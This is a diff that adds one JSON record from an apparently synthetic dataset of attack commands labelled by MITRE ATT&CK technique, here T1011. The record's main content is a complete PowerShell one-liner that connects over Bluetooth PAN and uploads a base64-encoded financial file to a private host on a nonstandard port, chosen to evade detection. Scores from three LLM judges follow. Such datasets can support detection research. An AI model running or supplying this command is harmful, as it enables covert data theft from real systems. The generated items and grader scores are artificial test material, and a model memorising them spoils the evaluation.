@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null",
+  "explanation": "Uses HTTP PUT to a custom port over a Bluetooth PAN-isolated subnet to exfiltrate base64 data, aligning with exfiltration over another network medium (T1011).",
+  "rationale_steps": [
+    "Establish Bluetooth PAN connectivity using a Bluetooth manipulation tool.",
+    "Assign a static /30 address to the Bluetooth interface with netsh.",
+    "Send base64 data using HTTP on a nonstandard port to reduce detection.",
+    "Destination IP is only reachable over Bluetooth, forcing that medium."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-92ef89c1",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell line is well-formed with balanced quotes/parentheses, valid separators, and parseable constructs.",
+        "semantic_score": 3,
+        "semantic_justification": "It aims to exfiltrate over a Bluetooth PAN using HTTP and base64 (aligned with T1011), but relies on a dubious BluetoothCL /connect NAP capability and a netsh static IP set that likely requires admin and omits a gateway parameter, reducing operational plausibility.",
+        "combined_score": 4.0,
+        "confidence": 0.6,
+        "timestamp": "2025-10-01T08:47:42.179916Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignment, piping, and method invocation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1011 technique by establishing a Bluetooth PAN connection to a specific device, configuring the network interface, reading and base64-encoding a file, and exfiltrating it over the physical Bluetooth medium using HTTP.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:47:45.253800Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for PowerShell cmdlets, external commands, variable assignments, and .NET method calls, including proper quoting and command separators.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command aims to exfiltrate data over a Bluetooth PAN, which broadly aligns with T1011, the critical `netsh` command to configure the network interface requires Administrator privileges, directly contradicting the stated 'Privilege: None' and preventing the intended network setup from succeeding.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:48:07.356194Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
